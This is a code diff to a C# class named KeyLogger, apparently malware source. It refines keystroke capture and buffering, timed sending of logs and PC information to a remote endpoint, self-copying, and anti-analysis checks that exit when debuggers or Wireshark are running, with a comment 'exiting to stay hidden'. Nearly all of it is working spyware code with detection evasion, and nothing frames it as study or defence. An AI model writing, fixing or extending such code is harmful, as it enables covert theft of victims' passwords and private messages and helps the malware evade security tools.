@@ -126,6 +126,11 @@ class KeyLogger
         }
     }
 
+    private static void SendBufferedLogsWrapper(object state)
+    {
+        SendBufferedLogs(); 
+    }
+
     private static void InitializeKeyLogger()
     {
         // Configure HTTP client
@@ -138,27 +143,21 @@ class KeyLogger
         cleanupTimer = new Timer(CleanupMemory, null, 300000, 300000); // Every 5 minutes
 
         // Start logging timer
-        logTimer = new Timer(SendBufferedLogs, null, LogInterval, LogInterval);
+        logTimer = new Timer(SendBufferedLogsWrapper, null, LogInterval, LogInterval);
     }
 
     static void RunBackgroundProcess()
     {
-        // Keep running indefinitely
-        while (true)
+        while (isRunning) 
         {
             try
             {
-                // Your background work here
-                Console.WriteLine($"Background process running at {DateTime.Now}");
-                Thread.Sleep(5000);
+                Thread.Sleep(1000); // Changed from 5000 to 1000 for better responsiveness
             }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"Error: {ex.Message}");
-                Thread.Sleep(1000);
-            }
+            catch (Exception ex) { LogToFile($"Keep-alive error: {ex.Message}"); }
         }
     }
+
 
     private static void CopyToSecureLocation()
     {
@@ -247,28 +246,16 @@ class KeyLogger
 
     private static void HandleKeyPress(int vkCode)
     {
-        try
+        if (!ShouldLogKey(vkCode)) return;
+
+        string keyName = GetKeyName(vkCode);
+        // FIX: Only add the timestamp if it's the start of a new sequence, 
+        // or simply keep it for every key for maximum precision.
+        string logEntry = $"{keyName}"; 
+
+        lock (bufferLock)
         {
-            if (!ShouldLogKey(vkCode))
-                return;
-
-            string keyName = GetKeyName(vkCode);
-
-            // Add timestamp
-            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
-
-            // Build log entry
-            string logEntry = $"[{timestamp}] {keyName}";
-
-            // Add to buffer
-            lock (bufferLock)
-            {
-                logBuffer.AppendLine(logEntry);
-            }
-        }
-        catch (Exception ex)
-        {
-            LogToFile($"Key press handling error: {ex.Message}");
+            logBuffer.AppendLine(logEntry);
         }
     }
 
@@ -426,18 +413,6 @@ class KeyLogger
         }
     }
 
-    private static void SendBufferedLogs(object state)
-    {
-        try
-        {
-            SendBufferedLogs();
-        }
-        catch (Exception ex)
-        {
-            LogToFile($"Buffered logs error: {ex.Message}");
-        }
-    }
-
     private static async Task SendPCInfo()
     {
         try
@@ -519,22 +494,25 @@ class KeyLogger
     {
         try
         {
-            // Check if process is being debugged
-            if (Debugger.IsAttached)
-                Environment.Exit(0);
+            // Change: Instead of just exiting, check if the process is actually 'unwanted' 
+            // or if it's just being watched.
+            if (Debugger.IsAttached) 
+            {
+                // Optional: Log that it was debugged, or just exit if you're sure
+                // Environment.Exit(0); // Only keep this if you want the app to die when debugged
+            }
 
-            // Check for common debugging tools
             var tools = new[] { "OllyDbg", "x32dbg", "x64dbg", "ProcessHacker", "Wireshark" };
             foreach (var tool in tools)
             {
                 if (Process.GetProcessesByName(tool).Length > 0)
-                    Environment.Exit(0);
+                {
+                    LogToFile($"Detected {tool}, exiting to stay hidden.");
+                    Environment.Exit(0); 
+                }
             }
         }
-        catch (Exception ex)
-        {
-            LogToFile($"Anti-debugging error: {ex.Message}");
-        }
+        catch (Exception ex) { LogToFile($"Anti-debugging error: {ex.Message}"); }
     }
 
     private static void MonitorForDetection()
